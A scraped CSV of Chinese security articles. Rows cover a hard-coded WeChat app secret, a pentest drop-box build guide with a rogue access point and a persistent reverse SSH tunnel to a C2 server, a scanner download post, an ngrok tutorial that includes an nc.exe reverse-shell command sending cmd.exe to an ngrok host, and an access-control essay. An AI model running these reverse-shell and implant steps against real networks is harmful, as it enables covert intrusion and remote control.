((SendAuth.Resp)paramBaseResp).code;this.wx=((UserInfoService)ServiceFactory.getService(""userInfoService"")).getToken(this.url,""wxbd8xxxxxxxxxxx"",""8bfed4e81be113exxxxxxxxxxxxxxxx"",this.code, ""authorization_code"");这种实现方式将 Appid、Appsecret 写死在 APP 的代码之中，如果应用被黑客给反编译破解之后 (反破解可用乐固加固)，那么 Appid、Appsecret 就会被黑客窃取。从而可以伪装应用进行敏感操作、给第三方开发者带来经济和口碑上的损失。同时，如 APP将用户授权后 Access_Token 进行本地存储的话，也会被黑客窃取。这些都是不安全的方式。乐固对某社交 APP 漏洞扫描实况针对 APP 开发者的这种不安全的实现方式，乐固漏洞扫描提供了自动化扫描的能力，能够检查出是否有不安全的实现方式，是否采取了不安全的存储等漏洞风险、能够智能有效地挖掘出应用的安全漏洞（PS：在授权情况下进行的扫描）。△ 扫描实况△ 报告示例建议修复方式建议 Secret、用户数据（如 Access_Token）放在 APP 云端服务器，由云端中转接口调用请求。可以通过以下这种方式进行实现：△ 建议修复的实现方式Hey guys，本期授权登录里的这些漏洞风险你了解了吗？在移动 APP 安全方面，网民与开发者们还将遇到怎样的问题？看到这里的你又遇到过什么问题？欢迎留言，我们一起与腾讯移动安全专家探讨。乐固系列第二次与大家见面，对我们「移动 APP 安全揭秘第二期」满意度如何？下期期待什么样的内容？安小妹耐心听你说。","2016-10-17 16:37:53","移动安全","移动APP安全揭秘之第二期：授权登录的安全短板","http://nsoad.com/Article/MobileSecurity/20161017/586.html"
"5ccbfb5c4f2f0a0a7a69c154","在这篇文章中，我将会对比三款单版计算机，并试图从中挑选一款最适合用来搭建渗透测试环境，并且价格大概能在 110 美金左右的单板计算机。但不得不说的是，当我决定做这些","Kong","在这篇文章中，我将会对比三款单版计算机，并试图从中挑选一款最适合用来搭建渗透测试环境，并且价格大概能在 110 美金左右的单板计算机。但不得不说的是，当我决定做这些测试的时候，事实上已经完全超出了我的预算！如果你想跳过我以下关于 SBC 的对比内容，那么你可以直接到以下地址：点击 阅读有关渗透测试环境的直接搭建过程！概述几周前，我接到一个任务，对即将到来的零售组织商做一次评估。为了准备这次评估，我开始收集所有可能在活动中需要的装备，并试图获得对其网络的访问权。而社会工程学攻击的方式已经被我排除，因为我不可能要求任何一位员工插入我的 USB 设备，或者进入到他们的房间里，更别谈打开他们的终端，并检查他们的电子邮件内容了。从本质上说，我只能尝试使用物理攻击的方式。那么，我可以不可以使用基于物理攻击的 USB？例如：Rubber Ducky （橡皮鸭）。试想，如果目标系统没有相关的组策略设置及系统锁定，那么最理想的情况就是，直接获取一个基于命令行的远程反弹 shell 的控制。这里存在一个问题：即使我们能实现这种物理攻击，但由于我们并不了解目标网络的防火墙对出栈网络的过滤设置是什么，因此我们在外网能不能获取 shell 还是个问题。设备要求看看已经有的选项，很明显，我可以花超过1000美元买一些可以做我需要的事情的设备，或者试图建立一个相比较而言更便宜的。所以我设定了一些具体的目标，我想让这个设备做什么。它们是：1.设备的尺寸相对较小（能够被插入桌子底下而并不会被注意到）2.必须能够通过无线接口进行控制（如果有多个无线接口可以使用，可以获得奖励积分，那么无线管理和无线攻击可以同步进行）3.持续的反向的SSH隧道控制和指挥服务器4. 全功能渗透测试系统（路由攻击不仅仅通过一个筒体）5.相当好的存储空间（32-64GB）6.实际上它是一个可用的渗透测试盒子，它并不会由于硬件的限制而变得迟滞。硬件对比我买了三款目前市面上最受欢迎的 SBC 来做比较，并试图从中找出最适合用来搭建渗透测试环境，及完成我任务目标的设备。它们分别是：Raspberry Pi 3 Model BBeagleBone BlackHardkernel ODROID-C2从左往右分别是：BeagleBone Black, Raspberry Pi 3 Model B, ODROID-C2 。下面，首先让我们来对比下这些 SBC 的硬件规格：从上面的对比图表中我们可以得知，ODROID-C2 在处理器，GPU，RAM(随机存取存储器)，以太网速度及视频的分辨率和对 内嵌式存储器 emmc 的支持上，均完胜其它两款 SBC。但 BeagleBone Black (BBB) 支持 8 bit 4GB的 MMC卡，并支持更多的 I/O 和外部设备的接入。而Pi 3 则配备了一个无线适配器，在价格上也稍低于 C2 和 BBB。虽然，从以上这些数据大概可以确定 ODROID-C2 最适合用来搭建渗透测试系统，但是为了更加公平和客观，我接下来还会继续对它们各方面的性能，进行比较和测试。在价格相对便宜的情况下，我发现电路板，电源供应器，存储卡，和无线适配器这些方面的性能相对重要。BBB 和 Pi 3都只支持 microSD 卡的存储，而 ODROID-C2 同时支持 microSD 和 eMMC 存储。因此在关于 ODROID-C2 的测试中，我们主要测试的是  microSD 和 eMMC 这两种存储介质。操作系统我是个 kali 的忠实粉丝，每次我在做渗透测试的时候总会用到它。它不仅提供了桌面版，还提供了可供这些 SBC 所使用的 ARM 镜像版。我们可以在 这里 下载到它。它的烧录和安装也非常容易，因此我们就选用它作为我们比较的操作系统环境。Wireless我们可以从规格表中看到， Raspberry Pi 3 代已经为我们继承了一个 无线适配器，用于无线的连接。但是这里有个问题，就是 Raspberry Pi 3 自带的无线模块，并不支持监听模式和包的注入测试。因此它只能作为一个无线接入点，而不支持任何无线攻击的功能。为了解决这一问题，我决定给它配置个外接无线网卡。因此我在亚马逊上，找到了一款相对便宜的 无线网卡 ，大概 11.99 美金的样子。这款无线网卡的芯片型号是 RT5370 ，它完美的支持 监听模式 ，同时也完美支持在 Aireplay-ng 下进行包的注入。而且 BBB 和 C2 本身也都不支持 无线模块，因此买个这个    无线适配器 尤其重要。如果大家希望在 SBC 上进行无线渗透的话，我建议大家选择这款 无线适配器！      案例和整体外观我为 BeagleBone Black 购买了一款 黑色的外壳。因为我发现在我繁重的测试环境下，这块板子有点发热。对于另外两块板子，我则选择了一款带有风扇的外壳。     事实上对于外壳的购买， ODROID-C2 并没有太多的选择。但幸运的是， ODROID-C2 几乎像是 Raspberry Pi 3 的复制品。因此，它们的大部分接口位置也都差不多，所以许多 Pi 3 的外壳也都适用与它。对于 Pi 3 和 ODROID-C2，我购买的是这款 外壳        。这款外壳包含一个散热风扇，它是由两个 GPIO 引脚供电的。想要 Pi 3 的外壳完美的适用于 ODROID-C2，这里我们还需解决一个问题，就是电源插口没有匹配上。其实这只是一个小问题，只要拿个小电钻钻一下就可以了！                                          硬件总成本我决定使用 64 GB 的闪迪极速 MicroSDXC UHS-1 卡，作为这次测试的系统烧录存储卡。当然 64GB 大小的存储量是根据我个人的情况所决定的，你们完全可以使用更小的内存卡，这样还会降低你的成本支出。我也测试过 odroid-c2 的 eMMC 模块。但我只测试了一个32 GB 的 eMMC 模块，因为成本实在太高了。这里需要说明的是，Pi 3虽然自带了无线模块，但是并不支持无线渗透。因此是否购买 无线网卡则取决于你要做什么？而不是必须的。        功能测试在安装及配置好这三款 SBC 后，下面我将要通过各种测试，来对它们之间的功能差异进行比较和检验。我首先测试的是，它们的开机启动速度。我测试了从我按下 enter 键 reboot 重启，到显示登陆界面间的用时情况。我还测试了它们从重启后，到我能成功加载并运行 Metasploit console 所耗费的时间。从测试结果我得知，从重启到启动 Metasploit console ，ODROID-C2 共花了一分十四秒。这个速度比 Raspberry Pi 3 整整快了一分钟，比        BeagleBone Black 则快了整整两分钟！接下来，我又做了关于密码破解速度的测试。当然我并不会真的去破解别人的密码，因为这是违法的！而且从这几款 SBC 的处理器上看，它们也只适合于这种实验测试环境。因为它们的处理能力，相比于办公的电脑还是相对比较弱的。这次测试，我使用了  John the Ripper (./john –test) 这款破解工具来测试。最后，还是 ODROID-C2 更加出色！接着我在这些设备上，使用 Nmap 分别执行了基本的端口扫描 (不加任何参数) 和有关服务信息的扫描 (使用参数 -sV) 。结果，在基本扫描下，这三款 SBC 均用时为 2 秒左右。在服务扫描下，则均用时为 2 分 23 秒左右。因此在这项测试中，它们不分上下！在最后一项比较中，我测试了它们的数据读取和写入速度。我首先使用‘dd’命令写入 1 GB 数据到硬盘中。接着，我清除了 Linux 的缓存，并再次使用 “dd”命令，从系统读取这 1GB 文件。我还使用 hdparm 命令，测试了缓冲和缓存读取到磁盘速度。而在这几项测试中， odroid-c2 占了绝对的优势！ODROID-C2 的 eMMC 模块的写入速度，比 Raspberry Pi 3 的 microSD 速度快了近 15 倍！而它的读取速度则比 Raspberry Pi 3 快了近        9 倍！甚至 ODROID-C2 的 microSD 卡的读写速度，也比 Raspberry Pi 3 快 2 倍！测试写入速度，我使用了如下命令：sync; dd if=/dev/zero of=tempfile bs=1M count=1024; sync测试读取速度，我使用了如下命令：/sbin/sysctl -w vm.drop_caches=3          dd if=tempfile of=/dev/null bs=1M count 1024测试了缓冲和缓存读取到磁盘速度，我使用如下命令：hdparm -Tt /dev/mmcblk0结论从以上一系列的测试中，我们不难看出，ODROID-C2 是最适合用来作为渗透测试盒子的 SBC 。因为它各方面相比于另外两款显得更快，也更稳定！事实也证明了这点，我将它放置在目标网络附近，并离开了三天它还依然在稳定的运作着！还好有无线接口。因为之前我接入的网络没有设置动态主机分配协议，因此我需要手动查找分支网络，并手动分配 IP 地址。如果没有这个无线接口，设备就不能正常连接到我外面服务器的控制终端上。在我配置完以上信息后，ODROID-C2 成功连通了一个 SSH 隧道到我的 C2 服务器上，并能完美的同时处理多个 Meterpreter sessions 。下面我将正式开始向大家介绍如何打造 ODROID-C2 下的渗透测试盒子。但是如果你早已有了一个在 ODROID-C2 上搭建的渗透测试盒子，或是想在其它 SBC上来打造这个盒子。那么你也可以翻看我之前的相关文章：ODROID-C2 w/ eMMC Pentest Drop Box Instructions            ODROID-C2 w/ microSD Pentest Drop Box Instructions            Raspberry Pi 3 Pentest Drop Box Instructions            BeagleBone Black Pentest Drop Box Instructions            ODROID-C2 w/ eMMC 渗透测试盒子搭建指南         硬件购买清单 ODroid-C2 – $41.95            DC 5V/2A 2.5毫米的电源适配器–6.99美元            32GB 的 ODROID-C2  eMMC 模块 (当然如果需要 eMMC 转到 MicroSD 适配器，则需要额外增加 1 美金)MicroSD 读卡器 – $6.99            RT5370 芯片 无线天线 – $11.99            ODroid-C2 外壳 – $9.99            Kali 镜像烧录1.下载 Kali ODROID-C2 镜像文件到 这里：2.烧录 kali 镜像到 eMMC 模块：如果你是 Windows 系统：1.使用 eMMC 转到 microSD 的适配器进行内存转换，然后再使用 microSD 的 USB 读卡器连接到 Windows 系统。2.使用 7zip 解压 kali-*-odroidc2.img.xz 文件。3.使用 Win32DiskImager 将 kali 烧录进 eMMC 。如果你是  Linux 系统：1.使用 eMMC 转到 microSD 的适配器进行内存转换，然后再使用 microSD 的 USB 读卡器连接到 Linux 系统。2.使用 dd 工具将 kali 镜像文件写入 eMMC。(在这里千万要小心不要选错你所挂载的存储设备，如果错选很有可能会格式化你的磁盘。在下面的例子中，我的挂载点是 /dev/sdb 但你的可能不同，所以应视情况进行相应的改变。)xzcat kali-*-odroidc2.img.xz | dd of=/dev/sdb bs=512k3.修复eMMC启动问题(由于一些原因，在引导分区的 uinitrd 文件，在重启后出现损坏的情况。)这是一个已知的问题，并已有相关文档在 github 上：https://github.com/offensive-security/kali-arm-build-scripts/issues/76 。你可以根据以下我提供的步骤，解决该问题。            1.当 eMMC 仍然处于插入连接的状态，我们拷贝 /boot 分区下的 Image, meson64_odroidc2.dtb, 和 uInitrd 文件，并关闭分区。2.创建一个名为 “backup”的文件夹，并将 Image, meson64_odroidc2.dtb, 和 uInitrd 文件，拷贝进该文件夹下。3.将 eMMC卡插到 odroid-c2 板子上，并将 鼠标键盘及 HDMI 电缆插入到相应的接口，然后启动电源。4.使用用户名为 “root”密码为“toor”账户登录 Kali Linux。5.挂载 boot 分区并让它自动挂载到 /etc/fstab 下。mount /dev/mmcblk0p1 /bootecho ‘/dev/mmcblk0p1 /boot auto defaults 0 0′ &gt;&gt; /etc/fstab4. 创建备份还原脚本：         nano /boot/backup/restore.sh将以下内容拷贝至 /boot/backup/restore.sh 脚本：         #!/bin/bashcp /boot/backup/* /boot/5. 赋予其执行权限并确保没有错误存在：         chmod 755 /boot/backup/restore.sh/boot/backup/restore.sh6.将脚本添加到开机启动配置文件 rc.local：         nano /etc/rc.local在 ‘exit 0’之前添加以下信息：         /boot/backup/restore.sh7.插入以太网电缆，使其连通网络。odroid-c2 会自动尝试通过 DHCP 获得 IP 地址。8.修改默认密码使用 ‘passwd’命令。9. 扩展文件系统，使其覆盖整个 eMMC 存储空间。我们使用 fdisk 命令来实现空间的扩展，完成扩展后我们可以使用 ‘df –H’ 命令来查看扩展情况。fdisk /dev/mmcblk0d           ###The ‘d’ option allows us to delete a partition2           ###We select partition 2 to be deletedn           ###The ‘n’ option creates a new partitionp           ###’p’ creates a primary partition2           ###Set partition number 2Accept default First sector   ###The start sector of the diskAccept default Last sector    ###The end sector of the diskw                             ###Use ‘w’ to write the changesreboot                        ###reboot, then log back inresize2fs /dev/mmcblk0p2 ###Use resize2fs to grow the partition10.更新 kali 系统：         apt-get update &amp;&amp; upgrade建立 wifi 接入点1.安装 hostapd         apt-get install hostapd2. 创建 /etc/hostapd/hostapd.conf 文件         nano /etc/hostapd/hostapd.conf3.将以下内容拷贝至 hostapd.conf 内文件，并根据自身情况修改 ssid, 和 wpa_passphrase# Interface configurationinterface=wlan0ssid=tortugaschannel=1# WPA configurationmacaddr_acl=0auth_algs=3ignore_broadcast_ssid=0wpa=3wpa_passphrase=@pirateslife4me@wpa_key_mgmt=WPA-PSKwpa_pairwise=CCMP TKIPrsn_pairwise=CCMP# Hardware configurationdriver=nl80211ieee80211n=1hw_mode=g4.修改 /etc/init.d/hostapd 文件：         nano /etc/init.d/hostapd找到下面这行内容：         DAEMON_CONF=修改如下：         DAEMON_CONF=/etc/hostapd/hostapd.conf5.安装 Dnsmasq         apt-get install dnsmasq6.修改 /etc/dnsmasq.conf 文件         nano /etc/dnsmasq.conf并将以下内容添加到配置文件内(该文件是用来绑定指定网卡和作为一个 DHCP 客户端的，它能分发 IP 地址，这里我的分发范围为 172.16.66.50-172.16.66.100)no-resolv# Interface to bind tointerface=wlan0bind-interfaces# Specify starting_range,end_range,lease_timedhcp-range=172.16.66.50,172.16.66.100,255.255.255.0,12h7.修改本地网络配置文件         nano /etc/network/interfaces并修改成如下信息：auto wlan0allow-hotplug wlan0iface wlan0 inet staticaddress 172.16.66.1netmask 255.255.255.0此时我们插入我们购买的无线网卡，并尝试将接口激活。         airmon-ng check killhostapd /etc/hostapd/hostapd.conf如果这里没有错误，你现在应该能够连接到一个由你伪造的 SSID 无线网络。9.使 hostapd 文件支持开机启动         update-rc.d hostapd enable10.使 dnsmasq文件支持开机启动         nano /etc/rc.local在 /etc/rc.local 文件的‘exit 0’前面增加下面一行：         service dnsmasq start设置自动反向 SSH 隧道首先，我们假设已有一台在互联网上，可以控制和进行命令操纵的服务器，并且支持 SSH 服务，端口为默认的 22 端口。1.安装 ‘autossh’ 通过命令自动创建一个可以控制该服务器的 SSH 隧道连接。         apt-get install autossh2.生成 SSH 密钥，所有设置均默认即可。         ssh-keygen3.将 /root/.ssh/id_rsa.pub 文件远程拷贝至 C2 服务器。scp /root/.ssh/id_rsa.pub root@&lt;C2 IP Address&gt;:/directory/to/upload/to/4.在 C2 服务器上，将 id_rsa.pub 的内容追加到 ~/.ssh/authorized_keys 内：# On C2 servercat /directory/to/upload/to/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys5.测试基于密钥的身份验证。如果以上一切顺利的话，我们就能在 C2 服务器上不需要密码登陆 SSH ：# On the ODROID-C2ssh root@&lt;C2 IP address&gt;6.测试 ‘autossh’：autossh -M 11166 -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” -i /root/.ssh/id_rsa -R 6667:localhost:22 root@&lt;C2 IP Address&gt;如果以上一切顺利的话，那么就会在 C2 服务器上建立一个端口为 6667 的 SSH 隧道的 shell 连接。7.将 SSH 隧道连接命令添加到开机启动配置文件内：nano /etc/rc.local添加以下内容：            autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” -i /root/.ssh/id_rsa -R 6667:localhost:22 root@&lt;C2 IP Address&gt; &amp;-N：不要在中间人机器上执行命令。-M：监听端口。            &amp;：在后台执行该命令，如果不加该参数很有可能导致机器挂死。            相关工具虽然有些工具已被集成在了 Kali ARM 镜像内，但并不是所有的工具。 (像 sqlmap, wireshark, nmap, hydra, john, aircrack-ng 这些工具已经被默认集成安装)1.因此，我们可以自主的安装一些我们想用的工具：apt-get install responder metasploit-framework macchanger voiphopper snmpcheck onesixtyone patator isr-evilgrade creddump screen2.我们不仅可以通过以上我介绍的方式，实现 AP 的伪造，其实我们还可以使用以下方式来实现 AP 的伪造：service hostapd stopairmon-ng check killairmon-ng start wlan0airodump-ng wlan0mon ### Or any other wireless attack toolkit…3.对于 “攻击” 所使用的无线网卡，我们要视挂载情况，选择正确的无线网卡，并将其置成侦听模式才行。","2016-11-02 15:50:25","安全工具","如何使用ODROID-C2打造个人专属的渗透测试系统？","http://nsoad.com/Security-tools/20161102/tools-677.html"
"5ccbfb5c4f2f0a0a7a69c155","渗透测试是寻找能够用来攻击应用程序、网络和系统的漏洞的过程，其目的是检测会被黑客攻击的安全脆弱点。渗透测试可以检测如下内容：系统对攻击的反应，存在哪些会被攻击的","blackhold","Netsparker是一个便于使用的Web应用漏洞扫描工具，可以爬行、攻击并识别各种Web应用中存在的漏洞。Netsparker能识别的 Web应用漏洞包括SQL注入、XSS（跨网站指令码）、命令注入、本地文件包含和任意文件读取、远程文件包含、框架注入、内部路径信息披露等。不 同于其它漏洞扫描工具，Netsparker具有相当低的误报率，因为Netsparker执行多次测试以确认任何被识别的漏洞。它还有一个 JavaScript引擎，可以解析、执行并分析Web应用中使用的JavaScript和VBScript输出。因此，Netsparker能成功爬行 并了解网站（使用不同的AJAX框架、自定义代码或知名的框架如jQuery）。如果一个网站扫描检测到WSDL（网络服务定义语言）文件，Netsparker也会自动扫描这些网络服务。此外，它还提供以下功能：·详细的问题报告：尽可能详细地报告问题。·自动化：提供命令行接口，可以通过该接口自动扫描并将Netsparker集成到自动扫描、报告或开发系统。·记录：所有HTTP请求和响应日志，以及所有被识别的漏洞，以及其它扫描相关数据。下载地址： http://pan.baidu.com/s/1nuYqSBZ 密码：hbfa","2016-08-27 10:35:42","安全工具","Netsparker 4.6.1—黑客的Web应用漏洞扫描工具","http://nsoad.com/Security-tools/20160827/tools-329.html"
"5ccbfb5c4f2f0a0a7a69c156","LOKI是一款APT入侵痕迹扫描软件，以入侵威胁指标(IOC)和黑客工具特征为对象，发现入侵事件和痕迹，其内置的指标特征来自公开发布的事件报告、取证分析和恶意样本等。LOKI由","blackhold","双方都是内网的反弹shell工具。Ngrok的下载地址:https://ngrok.com/download如果你是MAC OS X或者linux可以按照以下步骤安装。$ unzip /path/to/ngrok.zip然后查看他支持的命令$ ./ngrokhelp如果你是 windows下可以按照以下步骤安装下载下了后选中文件，右键解压到当前文件夹。什么，你右键菜单没有这个选项。那么请安装《winrar烈火汉化破解版》。然后有个窗口一闪而过。之后会出现这个:然后按下 微软徽标键+R (PS：微软徽标键就是 在你的键盘上Ctrl和Alt中间的那个键。)输入cmd然后回车。打开cmd后，将刚才解压出来的ngrok.exe拖入。然后再输入help 回车。可以看到它支持很多命令。NAME:  ngrok - tunnel local ports to public URLs and inspect trafficDESCRIPTION:   ngrok exposes local networked services behinds NATs and firewalls to the   public internet over a secure tunnel. Share local websites, build/test   webhook consumers and self-host personal services.   Detailed help for each command is available with 'ngrok help&lt;command&gt;'.   Open http://localhost:4040 for ngrok's web interface to inspect traffic.EXAMPLES:   ngrok http 80                    #secure public URL for port 80 web server   ngrok http -subdomain=baz 8080   #port 8080 available at baz.ngrok.io   ngrok http foo.dev:80            #tunnel to host:port instead of localhost   ngrok tcp 22                     #tunnel arbitrary TCP traffic to port 22   ngrok tls -hostname=foo.com 443  #TLS traffic for foo.com to port 443   ngrok start foo bar baz          #start tunnels from the configuration fileVERSION:  2.1.3AUTHOR: inconshreveable - &lt;alan@ngrok.com&gt;COMMANDS:  authtoken    save authtoken toconfiguration file  credits      prints author andlicensing information  http         start an HTTP tunnel  start        start tunnels by namefrom the configuration file  tcp          start a TCP tunnel  tls          start a TLS tunnel  update       update ngrok to thelatest version  version      print the versionstring  help         Shows a list ofcommands or help for one command使用前先要去注册个账号，地址:https://dashboard.ngrok.com/user/login不要告诉我你不会注册账号。先执行认证。Windows图:会提示你Authtoken saved toconfiguration file:认证文件存到哪里。Linux图:(PS：Authtoken懒得打码了，请不要搞事)认证Token导入好后，开始讲内网穿透的部分。./ngrok tcp 9999   **获得一个公网地址，如下图。ngrok 是不能后台运行的，所以我们要借助screen（用法百度）实现后台运行。然后再nc -vv -l -p 9999然后目标机器(内网的windos笔记本)执行nc.exe -vv 0.tcp.ngrok.io 15996 -e c:\Windows\System32\cmd.exe0.  tcp.ngrok.io 15996 为刚才利用ngrok 得到的公网地址，如下图然后就反弹回来shell。(PS：由于作者手中没有内网的服务器所以没截图)下面讲内网机器做HTTP请求记录器:只需要执行ngrok.exe http 80就可以了。会发现Tunnel Status                 online时Forwarding                    http://771c988f.ngrok.io -&gt; localhost:80Forwarding                    https://771c988f.ngrok.io -&gt; localhost:80访问后会有记录。http://localhost:4040是在线控制台，可以看请求的详细信息。如果你在80端口搭建了HTTP服务器，那么他就不是显示这个页面:而是将流量转发到HTTP服务上，访问的是自己内网的HTTP页面。参考: http://ttt.sssie.com/post-49.html(PS:由于有引导页，所以要访问两次。)*本文原创作者：2429946577，转载请注明FreeBuf","2016-08-19 12:43:18","安全工具","ngrok一款内网穿透+记录HTTP请求的神器(支持HTTPS)","http://nsoad.com/Security-tools/20160819/tools-320.html"
"5ccbfb5c4f2f0a0a7a69c157","数据作为信息的重要载体，其安全问题在信息安全中占有非常重要的地位。为了能够安全可控地使用数据，需要多种技术手段作为保障，这些技术手段一般包 括访问控制技术、加密技","dalamar","数据作为信息的重要载体，其安全问题在信息安全中占有非常重要的地位。为了能够安全可控地使用数据，需要多种技术手段作为保障，这些技术手段一般包 括访问控制技术、加密技术、数据备份和恢复技术、系统还原技术等多种技术手段。本文侧重论述访问控制技术，有关其它技术的探讨将发表在后续文章中。本文由亿赛通科技发展有限公司投稿。数据作为信息的重要载体，其安全问题在信息安全中占有非常重要的地位。数据的保密性、可用性、可控性和完整性是数据安全技术的主要研究内容。数据保 密性的理论基础是密码学，而可用性、可控性和完整性是数据安全的重要保障，没有后者提供技术保障，再强的加密算法也难以保证数据的安全。与数据安全密切相 关的技术主要有以下几种，每种相关但又有所不同。1、 访问控制： 该技术主要用于控制用户可否进入系统以及进入系统的用户能够读写的数据集；2、 数据流控制：该技术和用户可访问数据集的分发有关，用于防止数据从授权范围扩散到非授权范围；3、 推理控制：该技术用于保护可统计的数据库，以防止查询者通过精心设计的查询序列推理出机密信息；4、 数据加密：该技术用于保护机密信息在传输或存储时被非授权暴露；5、 数据保护：该技术主要用于防止数据遭到意外或恶意的破坏，保证数据的可用性和完整性。在上述技术中，访问控制技术占有重要的地位，其中1）、2）、3）均属于访问控制范畴。访问控制技术主要涉及安全模型、控制策略、控制策略的实现、授权与审计等。其中安全模型是访问控制的理论基础，其它技术则是实现安全模型的技术保障。1. 安全模型信息系统的安全目标是通过一组规则来控制和管理主体对客体的访问，这些访问控制规则称为安全策略，安全策略反应信息系统对安全的需求。安全模型是制定安全 策略的依据，安全模型是指用形式化的方法来准确地描述安全的重要方面（机密性、完整性和可用性）及其与系统行为的关系。建立安全模型的主要目的是提高对成 功实现关键安全需求的理解层次，以及为机密性和完整性寻找安全策略，安全模型是构建系统保护的重要依据，同时也是建立和评估安全操作系统的重要依据。自20世纪70年代起，Denning、Bell、Lapadula等人对信息安全进行了大量的理论研究，特别是1985年美国国防部颁布可信计算 机评估标准《TCSEC》以来，系统安全模型得到了广泛的研究，并在各种系统中实现了多种安全模型。这些模型可以分为两大类：一种是信息流模型；另一种是 访问控制模型。信息流模型主要着眼于对客体之间信息传输过程的控制，它是访问控制模型的一种变形。它不校验主体对客体的访问模式,而是试图控制从一个客体到另一个 客体的信息流，强迫其根据两个客体的安全属性决定访问操作是否进行。信息流模型和访问控制模型之间差别很小，但访问控制模型不能帮助系统发现隐蔽通道,而 信息流模型通过对信息流向的分析可以发现系统中存在的隐蔽通道并找到相应的防范对策。信息流模型是一种基于事件或踪迹的模型，其焦点是系统用户可见的行 为。虽然信息流模型在信息安全的理论分析方面有着优势，但是迄今为止，信息流模型对具体的实现只能提供较少的帮助和指导。访问控制模型是从访问控制的角度描述安全系统，主要针对系统中主体对客体的访问及其安全控制。访问控制安全模型中一般包括主体、客体，以及为识别和 验证这些实体的子系统和控制实体间访问的参考监视器。通常访问控制可以分自主访问控制(DAC)和强制访问控制(MAC)。自主访问控制机制允许对象的属 主来制定针对该对象的保护策略。通常DAC通过授权列表（或访问控制列表ACL）来限定哪些主体针对哪些客体可以执行什么操作。如此可以非常灵活地对策略 进行调整。由于其易用性与可扩展性，自主访问控制机制经常被用于商业系统。目前的主流操作系统，如UNIX、Linux和Windows等操作系统都提供 自主访问控制功能。自主访问控制的一个最大问题是主体的权限太大，无意间就可能泄露信息，而且不能防备特洛伊木马的攻击。强制访问控制系统给主体和客体分 配不同的安全属性，而且这些安全属性不像ACL那样轻易被修改，系统通过比较主体和客体的安全属性决定主体是否能够访问客体。强制访问控制可以防范特洛伊 木马和用户滥用权限，具有更高的安全性，但其实现的代价也更大，一般用在安全级别要求比较高的军事上。  随着安全需求的不断发展和变化，自主访问控制和强制访问控制已经不能完全满足需求，研究者提出许多自主访问控制和强制访问控制的替代模型，如基于栅格的访 问控制、基于规则的访问控制、基于角色的访问控制模型和基于任务的访问控制等。其中最引人瞩目的是基于角色的访问控制  (RBAC)。其基本思想是：有一组用户集和角色集，在特定的环境里，某一用户被指定为一个合适的角色来访问系统资源；在另外一种环境里，这个用户又可以 被指定为另一个的角色来访问另外的网络资源，每一个角色都具有其对应的权限，角色是安全控制策略的核心，可以分层，存在偏序、自反、传递、反对称等关系。 与自主访问控制和强制访问控制相比，基于角色的访问控制具有显著优点：首先，它实际上是一种策略无关的访问控制技术。其次，基于角色的访问控制具有自管理 的能力。此外，基于角色的访问控制还便于实施整个组织或单位的网络信息系统的安全策略。目前，基于角色的访问控制已在许多安全系统中实现。例如，在亿赛通 文档安全管理系统SmartSec（见“文档安全加密系统的实现方式”一文）中，服务器端的用户管理就采用了基于角色的访问控制方式，从而为用户管理、安 全策略管理等提供了很大的方便。随着网络的深入发展，基于Host-Terminal环境的静态安全模型和标准已无法完全反应分布式、动态变化、发展迅速的Internet的安全 问题。针对日益严重的网络安全问题和越来突出的安全需求，“可适应网络安全模型”和“动态安全模型”应运而生。基于闭环控制的动态网络安全理论模型在90 年代开始逐渐形成并得到了迅速发展，1995年12月美国国防部提出了信息安全的动态模型，即保护（Protection）—检测（Detection） —响应（Response）多环节保障体系，后来被通称为PDR模型。随着人们对PDR模型应用和研究的深入，PDR模型中又融入了策略（Policy） 和恢复（Restore）两个组件，逐渐形成了以安全策略为中心，集防护、检测、响应和恢复于一体的动态安全模型，如图1所示。PDR扩展模型示意图PDR模型是一种基于闭环控制、主动防御的动态安全模型，在整体的安全策略控制和指导下，在综合运用防护工具（如防火墙、系统身份认证和加密等手 段）的同时，利用检测工具（如漏洞评估、入侵检测等系统）了解和评估系统的安全状态，将系统调整到“最安全”和“风险最低”的状态。保护、检测、响应和恢 复组成了一个完整的、动态的安全循环，在安全策略的指导下保证信息的安全。2. 访问控制策略访问控制策略也称安全策略，是用来控制和管理主体对客体访问的一系列规则，它反映信息系统对安全的需求。安全策略的制定和实施是围绕主体、客体和安全控制规则集三者之间的关系展开的，在安全策略的制定和实施中，要遵循下列原则：最小特权原则：最小特权原则是指主体执行操作时，按照主体所需权利的最小化原则分配给主体权力。最小特权原则的优点是最大程度地限制了主体实施授权行为，可以避免来自突发事件、错误和未授权使用主体的危险。最小泄漏原则：最小泄漏原则是指主体执行任务时，按照主体所需要知道的信息最小化的原则分配给主体权力。多级安全策略：多级安全策略是指主体和客体间的数据流向和权限控制按照安全级别的绝密、秘密、机密、限制和无级别五级来划分。多级安全策略的优点是避免敏感信息的扩散。具有安全级别的信息资源，只有安全级别比他高的主体才能够访问。访问控制的安全策略有以下两种实现方式：基于身份的安全策略和基于规则的安全策略。目前使用的两种安全策略，他们建立的基础都是授权行为。就其形式而言，基于身份的安全策略等同于DAC安全策略，基于规则的安全策略等同于MAC安全策略。2.1. 基于身份的安全策略基于身份的安全策略（IDBACP：Identification-based Access Control  Policies）的目的是过滤主体对数据或资源的访问，只有能通过认证的那些主体才有可能正常使用客体资源。基于身份的策略包括基于个人的策略和基于组 的策略。基于身份的安全策略一般采用能力表或访问控制列表进行实现。2.1.1 基于个人的策略基于个人的策略（INBACP：Individual-based Access Control Policies）是指以用户为中心建立的一种策略，这种策略由一组列表组成，这些列表限定了针对特定的客体，哪些用户可以实现何种操作行为。2.1.2 基于组的策略：基于组的策略（GBACP：Group-based Access Control Policies）是基于个人的策略的扩充，指一些用户(构成安全组)被允许使用同样的访问控制规则访问同样的客体。2.2. 基于规则的安全策略基于规则的安全策略中的授权通常依赖于敏感性。在一个安全系统中，数据或资源被标注安全标记(Token)。代表用户进行活动的进程可以得到与其原发者相 应的安全标记。基于规则的安全策略在实现上，由系统通过比较用户的安全级别和客体资源的安全级别来判断是否允许用户可以进行访问。3. 访问控制的实现由于安全策略是由一系列规则组成的，因此如何表达和使用这些规则是实现访问控制的关键。由于规则的表达和使用有多种方式可供选择，因此访问控制的实现也有多种方式，每种方式均有其优点和缺点，在具体实施中，可根据实际情况进行选择和处理。常用的访问控制有以下几种形式。3.1. 访问控制表访问控制表（ACL：Access Control  List）是以文件为中心建立的访问权限表，一般称作ACL。其主要优点在于实现简单，对系统性能影响小。它是目前大多数操作系统（如Windows、 